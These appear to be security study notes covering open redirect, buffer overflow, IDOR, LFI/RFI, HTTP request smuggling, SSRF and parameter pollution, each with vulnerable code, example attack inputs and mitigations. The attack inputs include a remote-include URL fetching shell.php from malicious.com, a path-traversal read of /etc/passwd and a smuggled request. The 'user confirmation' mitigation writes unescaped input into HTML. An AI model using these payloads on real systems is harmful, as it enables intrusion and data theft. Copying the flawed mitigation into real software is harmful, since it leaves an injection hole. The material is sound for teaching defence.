### What is Open Redirect

**Open Redirect** is a web security vulnerability that occurs when a web application allows user-controlled input to affect the URL to which a user is redirected, without proper validation or filtering. This can be exploited by attackers to redirect users to malicious sites, conduct phishing attacks, and bypass security mechanisms.

**How Open Redirect Works**

1. **User Input**: The application takes a URL or part of a URL from user input (e.g., query parameters, form data).
2. **Redirection**: The application uses this input to construct a redirection URL.
3. **No Validation**: The application does not properly validate or sanitize the input, allowing potentially dangerous URLs to be used.

**Example Scenario**

Consider a web application with a URL parameter that determines the redirection target after a successful login:

```bash
http://example.com/login?redirect=http://example.com/home
```

An attacker can exploit this by modifying the `redirect` parameter:

```bash
http://example.com/login?redirect=http://malicious.com
```

If the application redirects to the URL specified in the `redirect` parameter without validation, users can be redirected to the malicious site.

**Effects of Open Redirect Vulnerability**

1. **Phishing Attacks**: Attackers can redirect users to fake login pages that look like the legitimate site to steal credentials.
2. **Malware Distribution**: Users can be redirected to sites hosting malware.
3. **Bypassing Security**: Attackers can bypass security measures that rely on the trustworthiness of URLs (e.g., whitelisting mechanisms).
4. **Reputation Damage**: The legitimate site’s reputation can be damaged if users believe it is intentionally redirecting them to malicious sites.

**Mitigation Strategies**

1. **URL Whitelisting**: Only allow redirections to a predefined list of trusted URLs.
    
    ```java
    String redirectUrl = request.getParameter("redirect");
    if (whitelist.contains(redirectUrl)) {
        response.sendRedirect(redirectUrl);
    } else {
        response.sendRedirect("defaultPage");
    }
    ```
    
2. **Relative URLs**: Use only relative URLs for internal redirections instead of allowing full URLs.
    
    ```java
    String redirectUrl = request.getParameter("redirect");
    if (redirectUrl.startsWith("/")) {
        response.sendRedirect(redirectUrl);
    } else {
        response.sendRedirect("/defaultPage");
    }
    ```
    
3. **Validation and Sanitization**: Validate and sanitize user input to ensure it does not contain dangerous URLs or characters.
    
    ```java
    String redirectUrl = request.getParameter("redirect");
    if (isValidUrl(redirectUrl)) {
        response.sendRedirect(redirectUrl);
    } else {
        response.sendRedirect("/defaultPage");
    }
    
    // Example validation function
    private boolean isValidUrl(String url) {
        try {
            URI uri = new URI(url);
            return "http".equals(uri.getScheme()) || "https".equals(uri.getScheme());
        } catch (URISyntaxException e) {
            return false;
        }
    }
    ```
    
4. **Security Headers**: Use HTTP headers like `Content-Security-Policy` (CSP) to restrict where content can be loaded from.
    
    ```
    Content-Security-Policy: default-src 'self'
    ```
    
5. **User Confirmation**: Prompt the user for confirmation before proceeding with the redirection.
    
    ```java
    String redirectUrl = request.getParameter("redirect");
    response.getWriter().write("<a href='" + redirectUrl + "'>Click here to continue</a>");
    ```
    

### What is Buffer Overflow

**Buffer Overflow** is a vulnerability that occurs when a program writes more data to a buffer (a contiguous block of memory) than it is allocated to hold. This extra data can overwrite adjacent memory, potentially leading to unexpected behavior, crashes, or the execution of malicious code.

**How Buffer Overflow Happens**

1. **Buffer Allocation**: A buffer is allocated a fixed amount of memory.
2. **Excess Data**: The program writes more data to the buffer than it can hold.
3. **Memory Overwrite**: The excess data overwrites adjacent memory locations, which can include other variables, control data, or executable code.

Example Scenario

Consider a simple C program that copies user input into a buffer without checking its size:

```c
#include <stdio.h>#include <string.h>void vulnerable_function(char *input) {
    char buffer[10];
    strcpy(buffer, input);
    printf("Buffer content: %s\n", buffer);
}

int main() {
    char input[100];
    printf("Enter input: ");
    gets(input); // unsafe function, allows buffer overflow
    vulnerable_function(input);
    return 0;
}
```

What Happens Here:

1. **Input**: If the user inputs a string longer than 10 characters, the `buffer` array will overflow.
2. **Overflow**: The `strcpy` function does not check the length of `input`, so it writes all the input data into `buffer`, potentially overwriting adjacent memory.

**Effects of Buffer Overflow**

1. **Program Crash**: The program can crash due to corruption of the stack, heap, or other memory areas.
2. **Arbitrary Code Execution**: An attacker can inject malicious code into the overflowed buffer and execute it by overwriting the return address or function pointers.
3. **Data Corruption**: Valid data can be overwritten, leading to incorrect program behavior.
4. **Privilege Escalation**: An attacker can gain elevated privileges by exploiting a buffer overflow in a program running with higher privileges.

**Types of Buffer Overflows**

1. **Stack-based Buffer Overflow**: Occurs when the buffer is allocated on the stack (e.g., local variables in a function). The excess data can overwrite the return address or other control data on the stack.
2. **Heap-based Buffer Overflow**: Occurs when the buffer is allocated on the heap (e.g., dynamically allocated memory). The excess data can overwrite adjacent heap-allocated memory.
3. **Format String Vulnerability**: A type of buffer overflow where the format string parameter of functions like `printf` is manipulated to read or write memory.

**Mitigation Strategies**

1. **Bounds Checking**: Always check the length of data before copying it to a buffer.
    - Use safer functions like `strncpy` instead of `strcpy`.
        
        ```c
        strncpy(buffer, input, sizeof(buffer) - 1);
        buffer[sizeof(buffer) - 1] = '\0'; // Null-terminate
        ```
        
2. **Buffer Size Management**: Ensure that buffers are large enough to hold the maximum expected input.
    - Use dynamic memory allocation with proper bounds checking.
        
        ```c
        size_t len = strlen(input);
        char *buffer = (char *)malloc(len + 1);
        if (buffer) {
            strcpy(buffer, input);
        }
        ```
        
3. **Use Safe Libraries**: Use libraries that provide built-in bounds checking and safer functions.
    - Use functions like `snprintf` for formatted output.
        
        ```c
        snprintf(buffer, sizeof(buffer), "%s", input);
        ```
        
4. **Stack Canaries**: Use canaries to detect buffer overflows before the return address is overwritten.
    - Many modern compilers and operating systems include this protection.
5. **Address Space Layout Randomization (ASLR)**: Randomize the memory addresses used by system and application processes to make it harder for attackers to predict the location of specific code or data.
6. **Data Execution Prevention (DEP)**: Mark certain areas of memory as non-executable to prevent execution of code injected into those areas.
7. **Code Auditing and Static Analysis**: Regularly review and audit code to identify potential buffer overflow vulnerabilities. Use static analysis tools to detect issues.

### What Is IDOR

**Insecure Direct Object Reference (IDOR)** is a type of access control vulnerability that occurs when an application provides direct access to objects based on user-supplied input without sufficient validation and authorization checks. This can allow an attacker to access, modify, or delete data that they are not authorized to access.

**How IDOR Happens**

1. **Direct Access to Objects**: An application exposes an internal object, such as a file, database record, or URL parameter, directly to the user.
2. **User Input**: The user can manipulate this reference (e.g., changing a URL parameter) to access other objects.
3. **Lack of Authorization Checks**: The application does not properly check whether the user is authorized to access the requested object.

**Example Scenario**

Consider a web application that allows users to view their invoices by specifying an invoice ID in the URL:

```
http://example.com/invoice?invoice_id=12345
```

If the application simply uses the `invoice_id` parameter to fetch and display the invoice without checking whether the logged-in user is authorized to view that invoice, it can be exploited.

**Exploitation**

An attacker can change the `invoice_id` to another value:

```
http://example.com/invoice?invoice_id=12346
```

If there are no authorization checks, the attacker can view the invoice belonging to another user.

**Effects of IDOR**

1. **Data Exposure**: Unauthorized access to sensitive data, such as personal information, financial records, or proprietary data.
2. **Data Manipulation**: Unauthorized modification or deletion of data, potentially leading to data integrity issues.
3. **Privilege Escalation**: Gaining unauthorized access to higher-privilege resources or administrative functionalities.

Mitigation Strategies

1. **Authorization Checks**: Always perform proper authorization checks to ensure the user is allowed to access the requested object.
    
    ```java
    // Example in Java
    User user = getCurrentUser();
    Invoice invoice = getInvoiceById(invoiceId);
    if (!invoice.getOwnerId().equals(user.getId())) {
        throw new UnauthorizedAccessException("You are not authorized to view this invoice.");
    }
    ```
    
2. **Indirect Object References**: Use indirect references, such as random or hashed values, instead of direct object identifiers.
    
    ```java
    String indirectId = generateIndirectReference(invoiceId);
    // Store the mapping of indirectId to invoiceId securely
    ```
    
3. **Parameter Validation**: Validate and sanitize user input to ensure it conforms to expected patterns and values.
    
    ```java
    // Example in Python
    def validate_invoice_id(invoice_id):
        if not re.match(r'^\d+$', invoice_id):
            raise ValueError("Invalid invoice ID")
    ```
    
4. **Access Control Policies**: Implement and enforce strict access control policies based on the principle of least privilege.
    
    ```java
    // Example in Spring Security
    @PreAuthorize("hasPermission(#invoice, 'READ')")
    public Invoice getInvoice(Long invoiceId) {
        // Fetch and return the invoice
    }
    ```
    
5. **Secure Coding Practices**: Follow secure coding guidelines and regularly review code for potential IDOR vulnerabilities.
6. **Testing and Auditing**: Perform regular security testing and code audits to identify and remediate IDOR vulnerabilities.
    - **Penetration Testing**: Simulate attacks to test the robustness of access controls.
    - **Automated Scanners**: Use tools to detect common access control flaws.

### What are LFI and RFI Vulnerabilities

**Local File Inclusion (LFI)** and **Remote File Inclusion (RFI)** are web vulnerabilities that allow attackers to include files in the server's response. These vulnerabilities arise due to improper handling of user input in file inclusion mechanisms.

### Local File Inclusion (LFI)

**Local File Inclusion (LFI)** occurs when an attacker can trick the web application into including files from the local server's filesystem. This can lead to sensitive information disclosure, code execution, or even full system compromise.

**How LFI Happens**

- The application allows user input to specify a file to be included.
- The input is not properly validated or sanitized.
- An attacker manipulates the input to include sensitive files or execute code.

Example

```php
<?php
// Vulnerable code
$page = $_GET['page'];
include($page); // User-controlled input
?>
```

An attacker could exploit this by accessing:

```
http://example.com/index.php?page=/etc/passwd
```

### Remote File Inclusion (RFI)

**Remote File Inclusion (RFI)** occurs when an attacker can include remote files from an external server. This can lead to the execution of malicious code hosted on the attacker's server.

**How RFI Happens**

- The application allows user input to specify a file to be included.
- The input is not properly validated or sanitized.
- The attacker includes a URL to a remote file containing malicious code.

Example

```php
<?php
// Vulnerable code
$page = $_GET['page'];
include($page); // User-controlled input
?>
```

An attacker could exploit this by accessing:

```
http://example.com/index.php?page=http://malicious.com/shell.php
```

**Differences Between LFI and RFI**

- **LFI**:
    - Includes files from the local server's filesystem.
    - Typically used to read sensitive files or execute local code.
- **RFI**:
    - Includes files from a remote server.
    - Typically used to execute remote malicious code.

**Mitigation Strategies**

1. **Input Validation and Sanitization**:
    - Ensure user inputs are properly validated and sanitized.
    - Use whitelists for allowed files or paths.
2. **Disable URL Include Wrappers**:
    - Disable the ability to include remote files in your PHP configuration (`allow_url_include=0`).
3. **Use Secure Coding Practices**:
    - Avoid using user input directly in file inclusion functions.
    - Use predefined paths or constants instead of dynamic paths.
4. **Limit File Access**:
    - Restrict the directories and files that can be accessed by the application.
    - Use `open_basedir` directive in PHP to limit the files that can be opened by the application.
5. **Error Handling**:
    - Properly handle errors to avoid exposing sensitive information.
    - Do not display detailed error messages to users.

Example of Secure Code

```php
<?php
// Secure code example
$whitelist = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $whitelist)) {
    include("$page.php");
} else {
    include("error.php");
}
?>
```

Similar Vulnerabilities

- **Path Traversal**: Similar to LFI, where an attacker uses `../` sequences to access files outside the intended directory.
    - Example: `http://example.com/index.php?page=../../etc/passwd`

### What is Http Request Smuggling

Ref & Perfect description: https://portswigger.net/web-security/request-smuggling

It is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

Request smuggling is primarily associated with HTTP/1 requests. However, websites that support HTTP/2 may be vulnerable, depending on their back-end architecture.

**What happens in an HTTP request smuggling attack?**

Today's web applications frequently employ chains of HTTP servers between users and the ultimate application logic. Users send requests to a front-end server (sometimes called a load balancer or reverse proxy) and this server forwards requests to one or more back-end servers. This type of architecture is increasingly common, and in some cases unavoidable, in modern cloud-based applications.

When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. The protocol is very simple; HTTP requests are sent one after another, and the receiving server has to determine where one request ends and the next one begins:

!https://portswigger.net/web-security/images/forwarding-http-requests-to-back-end-server.svg

In this situation, it is crucial that the front-end and back-end systems agree about the boundaries between requests. Otherwise, an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems:

!https://portswigger.net/web-security/images/smuggling-http-request-to-back-end-server.svg

Here, the attacker causes part of their front-end request to be interpreted by the back-end server as the start of the next request. It is effectively prepended to the next request, and so can interfere with the way the application processes that request. This is a request smuggling attack, and it can have devastating results.

**How do HTTP request smuggling vulnerabilities arise?**

Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the `Content-Length` header and the `Transfer-Encoding` header.

The `Content-Length` header is straightforward: it specifies the length of the message body in bytes. For example:

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

The `Transfer-Encoding` header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

**Note**

Many security testers are unaware that chunked encoding can be used in HTTP requests, for two reasons:

- Burp Suite automatically unpacks chunked encoding to make messages easier to view and edit.
- Browsers do not normally use chunked encoding in requests, and it is normally seen only in server responses.

As the HTTP/1 specification provides two different methods for specifying the length of HTTP messages, it is possible for a single message to use both methods at once, such that they conflict with each other. The specification attempts to prevent this problem by stating that if both the `Content-Length` and `Transfer-Encoding` headers are present, then the `Content-Length` header should be ignored. This might be sufficient to avoid ambiguity when only a single server is in play, but not when two or more servers are chained together. In this situation, problems can arise for two reasons:

- Some servers do not support the `Transfer-Encoding` header in requests.
- Some servers that do support the `Transfer-Encoding` header can be induced not to process it if the header is obfuscated in some way.

If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) `Transfer-Encoding` header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.

**Example Scenario**

Consider an environment where a proxy server forwards requests to a back-end server. An attacker might exploit this setup as follows:

1. **Crafting a Malicious Request**:
    - The attacker sends a specially crafted HTTP request with conflicting `Content-Length` and `Transfer-Encoding` headers.
    
    ```
    httpCopy code
    POST / HTTP/1.1
    Host: victim.com
    Content-Length: 13
    Transfer-Encoding: chunked
    
    0
    
    GET /malicious HTTP/1.1
    Host: victim.com
    ```
    
2. **Interpretation by Proxy Server**:
    - The proxy server might interpret the request as having a body length of 13 bytes, followed by the `GET /malicious` request.
3. **Interpretation by Back-End Server**:
    - The back-end server might process the first part of the request (up to the `0\r\n\r\n` as an empty chunk) and then treat `GET /malicious HTTP/1.1` as a separate request.

**Effects of HTTP Request Smuggling**

1. **Security Bypass**: Attackers can bypass security controls implemented by the front-end server, such as input validation, authentication, or rate limiting.
2. **Cache Poisoning**: Attackers can manipulate the caching behavior, causing the server to cache malicious responses.
3. **Information Disclosure**: Attackers can access sensitive data by smuggling unauthorized requests.
4. **Session Hijacking**: Attackers can hijack user sessions by intercepting and modifying requests.

**Mitigation Strategies**

HTTP request smuggling vulnerabilities arise in situations where the front-end server and back-end server use different mechanisms for determining the boundaries between requests. This may be due to discrepancies between whether HTTP/1 servers use the `Content-Length` header or chunked transfer encoding to determine where each request ends. In HTTP/2 environments, the common practice of [downgrading HTTP/2 requests](https://portswigger.net/web-security/request-smuggling/advanced/http2-downgrading) for the back-end is also fraught with issues and enables or simplifies a number of additional attacks.

To prevent HTTP request smuggling vulnerabilities, we recommend the following high-level measures:

- Use HTTP/2 end to end and disable HTTP downgrading if possible. HTTP/2 uses a robust mechanism for determining the length of requests and, when used end to end, is inherently protected against request smuggling. If you can't avoid HTTP downgrading, make sure you validate the rewritten request against the HTTP/1.1 specification. For example, reject requests that contain newlines in the headers, colons in header names, and spaces in the request method.
- Make the front-end server normalize ambiguous requests and make the back-end server reject any that are still ambiguous, closing the TCP connection in the process.
- Never assume that requests won't have a body. This is the fundamental cause of both CL.0 and client-side desync vulnerabilities.
- Default to discarding the connection if server-level exceptions are triggered when handling requests.
- If you route traffic through a forward proxy, ensure that upstream HTTP/2 is enabled if possible.

### What is SSRF

Ref and more info: https://portswigger.net/web-security/ssrf

Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location. Actually an attacker can make the server send unauthorized requests to arbitrary locations, often leading to data exposure, internal network scanning, and other malicious activities.

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems. This could leak sensitive data, such as authorization credentials.

**How SSRF Happens**

1. **User-Supplied URLs**: The web application takes a URL or hostname as input from the user and makes an HTTP request to that URL.
2. **Lack of Validation**: The application fails to properly validate the input, allowing the attacker to specify any URL.
3. **Request Forgery**: The attacker manipulates the input to make the server request internal or sensitive resources.

**Example Scenario**

A web application has a feature to fetch content from a URL specified by the user:

```
GET /fetch?url=http://example.com/data
```

If the application does not validate the `url` parameter, an attacker can exploit this by providing a URL pointing to an internal service or sensitive resource:

```
GET /fetch?url=http://localhost/admin
```

**Effects of SSRF**

1. **Internal Network Scanning**:
    - Attackers can use SSRF to scan internal networks, identifying open ports and services.
2. **Access to Sensitive Data**:
    - Attackers can access internal services and sensitive data not intended for external exposure, such as metadata services in cloud environments.
3. **Remote Code Execution**:
    - In some cases, SSRF can be leveraged to execute code on internal systems, especially if the internal service is vulnerable.
4. **Bypassing Firewalls and ACLs**:
    - SSRF can bypass security controls like firewalls and Access Control Lists (ACLs) by making requests from the server, which might have more privileges.

**Mitigation Strategies**

1. **Input Validation**:
    - Whitelist acceptable URLs and domains.
    - Use a regex pattern or predefined list to validate user-supplied URLs.
    - Reject private IP addresses (e.g., 127.0.0.1, 10.0.0.0/8) and internal hostnames.
2. **Network Segmentation**:
    - Restrict internal services from making outbound requests to the internet.
    - Isolate servers that handle external requests from internal networks.
3. **Outbound Request Restrictions**:
    - Use a proxy to control and filter outgoing traffic.
    - Limit which services can make HTTP requests and to which destinations.
4. **Authentication and Authorization**:
    - Require authentication and proper authorization for accessing internal services.
    - Implement access control mechanisms to restrict access to sensitive resources.
5. **Monitoring and Logging**:
    - Monitor and log all outbound requests made by the server.
    - Set up alerts for unusual or unauthorized outbound traffic patterns.



**HTTP Parameter Pollution (HPP)** is a web security vulnerability that occurs when an attacker manipulates or injects multiple instances of the same HTTP parameter in a single request, potentially altering the behavior of web applications. This can lead to unexpected and potentially malicious outcomes.

**How HPP Works**

1. **Multiple Parameters**:
    - HPP exploits the way web applications handle multiple instances of the same parameter. For example, a URL might contain `?user=alice&user=bob`.
    - Different web frameworks handle these duplicates differently. Some may take the first value, others the last, and some might merge the values into an array.
2. **Example**:
    - Consider an application that processes user input from a URL query string:
        
        ```arduino
        https://example.com/profile?user=alice&role=admin
        ```
        
    - An attacker could add another `user` parameter:
        
        ```sql
        https://example.com/profile?user=alice&user=bob&role=admin
        ```
        
3. **Effect on Application Logic**:
    - The application's behavior can change based on which parameter value it processes, potentially leading to unauthorized actions, bypassing security checks, or triggering unexpected application behavior.

**Applications and Exploits**

- **Access Control Bypass**: An attacker might manipulate parameters to gain unauthorized access or escalate privileges.
- **SQL Injection and XSS**: If the application uses user input in database queries or renders it in the browser without proper sanitization, HPP can facilitate SQL Injection or Cross-Site Scripting (XSS) attacks.
- **Business Logic Manipulation**: Changing parameters might affect the application's business logic, leading to incorrect processing or data leakage.

**Example of HPP Attack**

Vulnerable Application:

```jsx
const express = require('express');
const app = express();

app.get('/profile', (req, res) => {
    const user = req.query.user;
    const role = req.query.role;
    if (role === 'admin') {
        // Show admin panel
        res.send(`Welcome admin ${user}`);
    } else {
        // Show user profile
        res.send(`Welcome user ${user}`);
    }
});

app.listen(3000, () => {
    console.log('Server running on port 3000');
});
```

HPP Exploit:

- Request: `https://example.com/profile?user=alice&user=bob&role=admin`
- Potential Outcome: Depending on how the server processes the parameters, `user=bob` might be used with `role=admin`, granting admin access to `bob`.

**Mitigation Strategies**

1. **Input Validation and Sanitization**:
    - Validate and sanitize all incoming parameters to ensure they meet expected formats and values.
    - Use allow-lists to only permit known and safe parameters.
2. **Consistent Parameter Handling**:
    - Ensure that the application consistently handles multiple instances of the same parameter. Decide whether to use the first occurrence, last occurrence, or reject requests with duplicate parameters.
3. **Framework Configuration**:
    - Configure web frameworks to handle multiple parameters safely and consistently.
    - Some frameworks offer configuration options to control how duplicate parameters are processed.
4. **Security Testing**:
    - Regularly test the application for HPP vulnerabilities using automated tools and manual testing techniques.
    - Implement a security review process to identify and fix potential HPP issues.

**Example of Mitigation**

Express.js Middleware to Handle Duplicates:

```jsx
app.use((req, res, next) => {
    const params = req.query;
    for (const key in params) {
        if (Array.isArray(params[key])) {
            // Handle duplicates, e.g., take the first value
            req.query[key] = params[key][0];
        }
    }
    next();
});
```
